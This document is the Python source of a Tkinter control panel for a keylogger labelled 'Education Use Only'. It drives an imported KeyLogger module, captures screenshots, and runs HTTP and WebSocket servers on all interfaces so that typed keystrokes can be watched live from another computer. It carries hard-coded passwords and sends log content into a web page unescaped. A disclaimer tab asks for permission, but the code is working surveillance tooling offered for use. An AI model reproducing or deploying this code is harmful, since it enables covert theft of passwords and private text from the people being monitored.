import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
from PIL import Image, ImageTk, ImageDraw
import threading
import os
import time
import socket
import requests
import base64
from keylogger import KeyLogger
import webbrowser
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
from datetime import datetime
from socketserver import ThreadingMixIn
import asyncio
import websockets
from websockets.server import serve as websocket_serve

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread"""
    daemon_threads = True

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.setup_window()
        self.setup_styles()
        
        self.logger = None
        self.logging_thread = None
        self.password = "admin123"
        self.active_sessions = []
        self.connected_clients = set()
        self.remote_server = None
        self.server_thread = None
        self.ws_server_thread = None
        
        # Show password dialog first
        self.show_password_dialog()
    
    def setup_window(self):
        self.root.title("Keylogger - Education Use Only")
        self.root.geometry("1000x700")
        self.root.minsize(800, 600)
        self.root.withdraw()
        
        try:
            icon_image = self.create_icon_image()
            icon_photo = ImageTk.PhotoImage(icon_image)
            self.root.tk.call('wm', 'iconphoto', self.root._w, icon_photo)
            self.icon_photo = icon_photo 
        except Exception as e:
            print(f"Error setting icon: {e}")

    def create_icon_image(self):
        image = Image.new('RGBA', (64, 64), (0, 0, 0, 0))
        dc = ImageDraw.Draw(image)
        
        # Key icon design
        key_color = (30, 144, 255)  # Dodger blue
        border_color = (0, 0, 139)  # Dark blue
        
        # Key bow (rounded part)
        dc.ellipse([(10, 10), (54, 54)], fill=key_color, outline=border_color, width=2)
        
        # Key shank (straight part)
        dc.rectangle([(32, 32), (54, 38)], fill=key_color, outline=border_color, width=2)
        
        # Key teeth (notches)
        dc.rectangle([(54, 30), (58, 34)], fill=key_color, outline=border_color, width=2)
        dc.rectangle([(54, 36), (58, 40)], fill=key_color, outline=border_color, width=2)
        
        # Keyhole in center
        dc.ellipse([(28, 28), (36, 36)], fill=(255, 255, 255), outline=border_color, width=1)
        
        # Add subtle highlight
        dc.arc([(12, 12), (52, 52)], start=45, end=135, fill=(255, 255, 255, 150), width=3)
        
        return image

    def setup_styles(self):
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Color scheme
        self.bg_color = '#f5f5f5'
        self.primary_color = '#1e88e5'
        self.secondary_color = '#1565c0'
        self.text_color = '#333333'
        self.success_color = '#4caf50'
        self.error_color = '#f44336'
        
        # Configure styles
        self.style.configure('.', background=self.bg_color, foreground=self.text_color)
        self.style.configure('TFrame', background=self.bg_color)
        self.style.configure('TLabel', background=self.bg_color, font=('Segoe UI', 10))
        self.style.configure('TButton', font=('Segoe UI', 10), padding=6)
        self.style.configure('Title.TLabel', font=('Segoe UI', 12, 'bold'))
        self.style.configure('Primary.TButton', background=self.primary_color, foreground='white')
        self.style.map('Primary.TButton',
                      background=[('active', self.secondary_color), ('disabled', '#cccccc')])
        self.style.configure('TNotebook', background=self.bg_color)
        self.style.configure('TNotebook.Tab', font=('Segoe UI', 10), padding=[10, 5])
        self.style.configure('Status.TLabel', font=('Segoe UI', 9))

    def show_password_dialog(self):
        self.pw_window = tk.Toplevel(self.root)
        self.pw_window.title("Authentication Required")
        self.pw_window.geometry("350x200")
        self.pw_window.resizable(False, False)
        self.pw_window.protocol("WM_DELETE_WINDOW", self.on_pw_window_close)
        
        self.center_window(self.pw_window)
        
        # Set icon
        try:
            icon_image = self.create_icon_image()
            icon_photo = ImageTk.PhotoImage(icon_image)
            self.pw_window.tk.call('wm', 'iconphoto', self.pw_window._w, icon_photo)
        except:
            pass
        
        main_frame = ttk.Frame(self.pw_window, padding=20)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(main_frame, text="Enter Password to Continue", style='Title.TLabel').pack(pady=(0, 15))
        
        self.pw_entry = ttk.Entry(main_frame, show="*", font=('Segoe UI', 12))
        self.pw_entry.pack(fill=tk.X, pady=5, ipady=5)
        self.pw_entry.bind('<Return>', lambda e: self.check_password())
        self.pw_entry.focus()
        
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=(10, 0))
        
        ttk.Button(btn_frame, text="Submit", style='Primary.TButton',
                  command=self.check_password).pack(side=tk.RIGHT, padx=5)
        ttk.Button(btn_frame, text="Cancel", command=self.root.quit).pack(side=tk.RIGHT)

    def center_window(self, window):
        window.update_idletasks()
        width = window.winfo_width()
        height = window.winfo_height()
        x = (window.winfo_screenwidth() // 2) - (width // 2)
        y = (window.winfo_screenheight() // 2) - (height // 2)
        window.geometry(f'{width}x{height}+{x}+{y}')

    def on_pw_window_close(self):
        """Handle password window close event"""
        self.root.quit()
        
    def check_password(self):
        if self.pw_entry.get() == self.password:
            self.pw_window.destroy()
            self.root.deiconify()
            self.logger = KeyLogger()
            self.create_widgets()
            self.update_status("Ready", self.success_color)
        else:
            messagebox.showerror("Error", "Incorrect password")
            self.pw_entry.delete(0, tk.END)
            self.pw_entry.focus()

    def create_widgets(self):
        # Main container
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Header
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Logo and title
        logo_frame = ttk.Frame(header_frame)
        logo_frame.pack(side=tk.LEFT)
        
        try:
            icon_image = self.create_icon_image().resize((32, 32))
            logo_img = ImageTk.PhotoImage(icon_image)
            logo_label = ttk.Label(logo_frame, image=logo_img)
            logo_label.image = logo_img
            logo_label.pack(side=tk.LEFT, padx=(0, 10))
        except:
            pass
        
        ttk.Label(logo_frame, text="Keylogger", style='Title.TLabel').pack(side=tk.LEFT)
        
        # Status indicator
        self.status_var = tk.StringVar(value="Ready")
        status_label = ttk.Label(header_frame, textvariable=self.status_var, 
                               style='Status.TLabel')
        status_label.pack(side=tk.RIGHT, padx=10)
        
        # Control buttons
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.start_btn = ttk.Button(control_frame, text="Start Logging", 
                                  style='Primary.TButton', command=self.start_logging)
        self.start_btn.pack(side=tk.LEFT, padx=2)
        
        self.stop_btn = ttk.Button(control_frame, text="Stop Logging", 
                                 style='Primary.TButton', command=self.stop_logging, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=2)
        
        ttk.Button(control_frame, text="Clear Logs", command=self.clear_logs).pack(side=tk.LEFT, padx=2)
        ttk.Button(control_frame, text="Open Log Folder", command=self.open_log_folder).pack(side=tk.LEFT, padx=2)
        ttk.Button(control_frame, text="Help", command=self.show_help).pack(side=tk.RIGHT, padx=2)
        
        # Notebook for tabs
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Disclaimer Tab (first tab)
        disclaimer_frame = ttk.Frame(self.notebook)
        self.notebook.add(disclaimer_frame, text="Important Notice")
        self.setup_disclaimer_tab(disclaimer_frame)

        # Remote Connection Tab (new tab)
        remote_frame = ttk.Frame(self.notebook)
        self.notebook.add(remote_frame, text="Remote Connection")
        self.setup_remote_tab(remote_frame)

        # Log tab
        log_frame = ttk.Frame(self.notebook)
        self.notebook.add(log_frame, text="Activity Log")
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame, 
            wrap=tk.WORD, 
            font=('Consolas', 10),
            padx=10,
            pady=10,
            bg='white',
            fg='black'
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Screenshots tab
        screenshots_frame = ttk.Frame(self.notebook)
        self.notebook.add(screenshots_frame, text="Screenshots")
        self.setup_screenshots_tab(screenshots_frame)
        
        # Footer
        footer_frame = ttk.Frame(main_frame)
        footer_frame.pack(fill=tk.X, pady=(10, 0))
        
        if hasattr(self, 'logger') and self.logger:
            ttk.Label(footer_frame, text=f"Session ID: {self.logger.session_id}").pack(side=tk.LEFT)
        
        ttk.Label(footer_frame, text="© 2025 Keylogger ").pack(side=tk.RIGHT)

    def setup_disclaimer_tab(self, parent_frame):
        """Setup the important notice/disclaimer tab"""
        disclaimer_text = """
        ⚠️ IMPORTANT LEGAL NOTICE ⚠️

        This keylogger software is provided STRICTLY FOR EDUCATIONAL PURPOSES ONLY.

        By using this software, you agree to the following terms:

        1. LEGAL USE ONLY:
           - You must have EXPLICIT PERMISSION from any person or organization 
           you monitor
           - Unauthorized use may violate privacy laws in your jurisdiction

        2. ETHICAL RESPONSIBILITY:
           - Never use this tool to invade someone's privacy
           - Never use for illegal activities
           - Never install on systems you don't own or have permission to monitor

        3. EDUCATIONAL PURPOSE:
           - This demonstrates cybersecurity concepts
           - Shows how keyloggers work for defensive purposes
           - Helps learn about system monitoring techniques

        4. NO WARRANTY:
           - Use at your own risk
           - Developer not responsible for misuse

        Violation of these terms may result in legal consequences.
        Only proceed if you understand and accept these conditions.
        """

        disclaimer_label = ttk.Label(
            parent_frame,
            text=disclaimer_text,
            font=('Segoe UI', 10),
            background='#fff3cd',  # Light yellow background
            foreground='#856404',   # Dark yellow text
            padding=20,
            justify=tk.LEFT,
            wraplength=800
        )
        disclaimer_label.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Add accept button
        accept_frame = ttk.Frame(parent_frame)
        accept_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Button(
            accept_frame,
            text="I Understand - Continue to Application",
            style='Primary.TButton',
            command=lambda: self.notebook.select(1)  # Switch to Activity Log tab
        ).pack(pady=10)

    def setup_remote_tab(self, parent_frame):
        """Setup the remote connection tab"""
        main_frame = ttk.Frame(parent_frame)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Connection Settings Frame
        settings_frame = ttk.LabelFrame(main_frame, text="Remote Monitoring Settings", padding=10)
        settings_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Port Configuration
        ttk.Label(settings_frame, text="Web Server Port:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.http_port_entry = ttk.Entry(settings_frame, width=10)
        self.http_port_entry.insert(0, "8080")
        self.http_port_entry.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        ttk.Label(settings_frame, text="WebSocket Port:").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.ws_port_entry = ttk.Entry(settings_frame, width=10)
        self.ws_port_entry.insert(0, "8081")
        self.ws_port_entry.grid(row=0, column=3, sticky=tk.W, padx=5, pady=5)

        # Password Protection
        ttk.Label(settings_frame, text="Access Password:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.remote_pass_entry = ttk.Entry(settings_frame, show="*")
        self.remote_pass_entry.insert(0, "monitor123")
        self.remote_pass_entry.grid(row=1, column=1, sticky=tk.EW, padx=5, pady=5)
        
        # Server Controls
        btn_frame = ttk.Frame(settings_frame)
        btn_frame.grid(row=2, column=0, columnspan=2, pady=(10, 0))
        
        self.start_server_btn = ttk.Button(
            btn_frame, 
            text="Start Remote Server", 
            style='Primary.TButton',
            command=self.start_remote_servers
        )
        self.start_server_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_server_btn = ttk.Button(
            btn_frame, 
            text="Stop Server", 
            state=tk.DISABLED,
            command=self.stop_remote_server
        )
        self.stop_server_btn.pack(side=tk.LEFT, padx=5)
        
        # Connection Status
        self.server_status_var = tk.StringVar(value="Server not running")
        status_frame = ttk.Frame(settings_frame)
        status_frame.grid(row=3, column=0, columnspan=2, pady=(10, 0))
        
        ttk.Label(status_frame, text="Status:").pack(side=tk.LEFT)
        ttk.Label(status_frame, textvariable=self.server_status_var, 
                 foreground='red').pack(side=tk.LEFT, padx=5)
        
        # Connection Instructions
        instr_frame = ttk.LabelFrame(main_frame, text="Remote Access Instructions", padding=10)
        instr_frame.pack(fill=tk.BOTH, expand=True)
        
        instructions = """
        1. Start the remote server using the button above
        2. On the monitoring computer, open a web browser
        3. Navigate to: http://[THIS-COMPUTER-IP]:[PORT]
        4. Enter the access password when prompted
        
        Note: Both computers must be on the same network
        """
        ttk.Label(instr_frame, text=instructions, justify=tk.LEFT).pack(anchor=tk.W)
        
        # Current Connection Info
        self.connection_info_var = tk.StringVar()
        ttk.Label(instr_frame, textvariable=self.connection_info_var, 
                 font=('Segoe UI', 9, 'bold')).pack(anchor=tk.W, pady=(10, 0))
        
    def start_remote_servers(self):
        """Start both HTTP and WebSocket servers"""
        try:
            http_port = int(self.http_port_entry.get())
            ws_port = int(self.ws_port_entry.get())
            password = self.remote_pass_entry.get()
            
            if http_port < 1024 or http_port > 65535 or ws_port < 1024 or ws_port > 65535:
                messagebox.showerror("Error", "Ports must be between 1024 and 65535")
                return
            
            # Start HTTP server in a thread
            handler = lambda *args: RemoteRequestHandler(
                *args, 
                password=password,
                ws_port=ws_port,
                logger=self.logger
            )
            self.remote_server = ThreadingHTTPServer(('0.0.0.0', http_port), handler)
            self.server_thread = threading.Thread(
                target=self.remote_server.serve_forever,
                daemon=True
            )
            self.server_thread.start()
            
            # Start WebSocket server in another thread
            self.ws_server_thread = threading.Thread(
                target=self.run_websocket_server,
                args=(ws_port,),
                daemon=True
            )
            self.ws_server_thread.start()
            
            # Update UI
            self.start_server_btn.config(state=tk.DISABLED)
            self.stop_server_btn.config(state=tk.NORMAL)
            self.server_status_var.set("Servers running")
            self.root.nametowidget('.!frame.!frame.!label').configure(foreground='green')
            
            # Show connection info
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            self.connection_info_var.set(
                f"Remote access URL: http://{local_ip}:{http_port}\n"
                f"WebSocket Port: {ws_port}\n"
                f"Access password: {password}"
            )
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start servers: {str(e)}")

    def run_websocket_server(self, port):
        """Run the WebSocket server in a new event loop"""
        async def handler(websocket, path):
            self.connected_clients.add(websocket)
            try:
                async for message in websocket:
                    # Handle incoming messages if needed
                    pass
            finally:
                self.connected_clients.remove(websocket)
        
        async def server_main():
            async with websocket_serve(handler, "0.0.0.0", port):
                await asyncio.Future()  # Run forever
        
        asyncio.set_event_loop(asyncio.new_event_loop())
        asyncio.get_event_loop().run_until_complete(server_main())

    def broadcast_log_update(self, log_entry):
        """Send log updates to all connected clients"""
        if not self.connected_clients:
            return
            
        message = json.dumps({
            "type": "log_update",
            "timestamp": datetime.now().isoformat(),
            "content": log_entry
        })
        
        for websocket in list(self.connected_clients):
            try:
                asyncio.run_coroutine_threadsafe(
                    websocket.send(message),
                    asyncio.get_event_loop()
                )
            except:
                self.connected_clients.remove(websocket)

    def stop_remote_server(self):
        """Stop the remote monitoring server"""
        if self.remote_server:
            self.remote_server.shutdown()
            self.remote_server = None
            self.server_thread = None
            
            # Update UI
            self.start_server_btn.config(state=tk.NORMAL)
            self.stop_server_btn.config(state=tk.DISABLED)
            self.server_status_var.set("Server not running")
            self.root.nametowidget('.!frame.!frame.!label').configure(foreground='red')
            self.connection_info_var.set("")

    def setup_screenshots_tab(self, parent_frame):
        """Setup the screenshots viewing tab"""
        # List of screenshots
        self.screenshot_listbox = tk.Listbox(
            parent_frame,
            selectmode=tk.SINGLE,
            font=('Segoe UI', 10)
        )
        self.screenshot_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(parent_frame, orient=tk.VERTICAL)
        scrollbar.config(command=self.screenshot_listbox.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.screenshot_listbox.config(yscrollcommand=scrollbar.set)
        
        # Preview frame
        preview_frame = ttk.Frame(parent_frame)
        preview_frame.pack(fill=tk.BOTH, expand=True)
        
        self.screenshot_preview = ttk.Label(preview_frame)
        self.screenshot_preview.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Bind selection event
        self.screenshot_listbox.bind('<<ListboxSelect>>', self.show_selected_screenshot)
        
        # Refresh button
        btn_frame = ttk.Frame(parent_frame)
        btn_frame.pack(fill=tk.X, pady=(5, 0))
        
        ttk.Button(btn_frame, text="Refresh", command=self.refresh_screenshots).pack(side=tk.LEFT)
        ttk.Button(btn_frame, text="Open Screenshot", command=self.open_selected_screenshot).pack(side=tk.LEFT, padx=5)
        
        # Initial refresh
        self.refresh_screenshots()

    def refresh_screenshots(self):
        """Refresh the list of screenshots"""
        self.screenshot_listbox.delete(0, tk.END)
        screenshots = [f for f in os.listdir() if f.startswith('screenshot_') and f.endswith('.png')]
        for screenshot in sorted(screenshots):
            self.screenshot_listbox.insert(tk.END, screenshot)

    def show_selected_screenshot(self, event):
        """Show the selected screenshot in preview"""
        selection = self.screenshot_listbox.curselection()
        if selection:
            filename = self.screenshot_listbox.get(selection[0])
            try:
                image = Image.open(filename)
                image.thumbnail((600, 400))
                photo = ImageTk.PhotoImage(image)
                self.screenshot_preview.config(image=photo)
                self.screenshot_preview.image = photo  # Keep reference
            except Exception as e:
                messagebox.showerror("Error", f"Could not load image: {str(e)}")

    def open_selected_screenshot(self):
        """Open the selected screenshot in default viewer"""
        selection = self.screenshot_listbox.curselection()
        if selection:
            filename = self.screenshot_listbox.get(selection[0])
            try:
                os.startfile(filename)
            except:
                try:
                    webbrowser.open(filename)
                except Exception as e:
                    messagebox.showerror("Error", f"Could not open image: {str(e)}")

    def start_logging(self):
        """Start the keylogger in a separate thread"""
        if not self.logger.is_running:
            self.logging_thread = threading.Thread(target=self.logger.start, daemon=True)
            self.logging_thread.start()
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            self.log_text.insert(tk.END, f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Logging started...\n")
            self.update_status("Logging active", self.success_color)
            self.log_text.see(tk.END)

    def stop_logging(self):
        """Stop the keylogger"""
        if self.logger and self.logger.is_running:
            log_path = self.logger.stop()
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.log_text.insert(tk.END, f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Logging stopped. Log saved to: {log_path}\n")
            self.update_status(f"Log saved to {log_path}", '#666666')
            self.log_text.see(tk.END)
            self.refresh_screenshots()

    def clear_logs(self):
        """Clear the log display (not the actual log file)"""
        self.log_text.delete(1.0, tk.END)
        self.log_text.insert(tk.END, f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Log display cleared.\n")
        self.update_status("Log display cleared", '#666666')
        self.log_text.see(tk.END)

    def open_log_folder(self):
        """Open the directory containing log files"""
        try:
            os.startfile(os.getcwd())
        except:
            messagebox.showinfo("Info", f"Log files are stored in:\n{os.getcwd()}")

    def show_help(self):
        """Show help information"""
        help_text = """Keylogger Pro Help:

1. Start Logging - Begin capturing keystrokes
2. Stop Logging - Stop capturing and save logs
3. Clear Logs - Clear the display (does not delete files)
4. Open Log Folder - View all saved log files
5. Screenshots Tab - View captured screenshots

Press Ctrl+Alt+S to capture screenshots while logging.
"""
        messagebox.showinfo("Help", help_text)

    def update_status(self, message, color=None):
        """Update the status bar"""
        self.status_var.set(message)
        if color:
            self.root.nametowidget('.!frame.!frame.!label').configure(foreground=color)

class RemoteRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, logger=None, password=None, ws_port=None, **kwargs):
        self.logger = logger
        self.password = password
        self.ws_port = ws_port
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Serve the monitoring interface"""
        if self.path == '/':
            if not self.authenticate():
                return
                
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            hostname = socket.gethostname()
            html = f"""
            <html>
            <head>
                <title>Live Keylogger Monitor - {hostname}</title>
                <style>
                    body {{ font-family: Arial; margin: 20px; }}
                    h1 {{ color: #1e88e5; }}
                    #log-container {{ 
                        background: #f5f5f5; 
                        border: 1px solid #ddd; 
                        padding: 10px;
                        margin-top: 20px;
                        height: 400px;
                        overflow-y: auto;
                    }}
                    .log-entry {{ margin-bottom: 5px; }}
                    .timestamp {{ color: #666; font-size: 0.9em; }}
                </style>
            </head>
            <body>
                <h1>Live Keylogger Monitor</h1>
                <p>Connected to: {hostname}</p>
                <p>Status: <span id="status">Connected</span></p>
                
                <div id="log-container"></div>
                
                <script>
                    const wsPort = {self.ws_port};
                    const host = window.location.hostname;
                    const ws = new WebSocket(`ws://${{host}}:${{wsPort}}`);
                    
                    ws.onmessage = function(event) {{
                        const data = JSON.parse(event.data);
                        if (data.type === 'log_update') {{
                            const logContainer = document.getElementById('log-container');
                            const entry = document.createElement('div');
                            entry.className = 'log-entry';
                            entry.innerHTML = `<span class="timestamp">${{data.timestamp}}</span> - ${{data.content}}`;
                            logContainer.appendChild(entry);
                            logContainer.scrollTop = logContainer.scrollHeight;
                        }}
                    }};
                    
                    ws.onclose = function() {{
                        document.getElementById('status').textContent = "Disconnected";
                        document.getElementById('status').style.color = "red";
                    }};
                </script>
            </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/logs':
            self.handle_logs_request()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')
    
    def authenticate(self):
        """Check password authentication"""
        if not self.password:
            return True
            
        auth_header = self.headers.get('Authorization', '')
        if not auth_header.startswith('Basic '):
            self.send_auth_challenge()
            return False
            
        encoded = auth_header.split(' ')[1]
        decoded = base64.b64decode(encoded).decode('utf-8')
        username, password = decoded.split(':', 1)
        
        if password == self.password:
            return True
            
        self.send_auth_challenge()
        return False
    
    def send_auth_challenge(self):
        """Send authentication challenge"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Keylogger Monitor"')
        self.end_headers()
        self.wfile.write(b'Authentication required')
        
    def handle_logs_request(self):
        """Handle AJAX requests for log data"""
        if not self.authenticate():
            return
            
        logs = []
        if self.logger:
            # Get the current log file content
            log_file = getattr(self.logger, 'log_file', None)
            if log_file and os.path.exists(log_file):
                with open(log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    logs.append({
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'content': content
                    })
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'logs': logs}).encode('utf-8'))

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()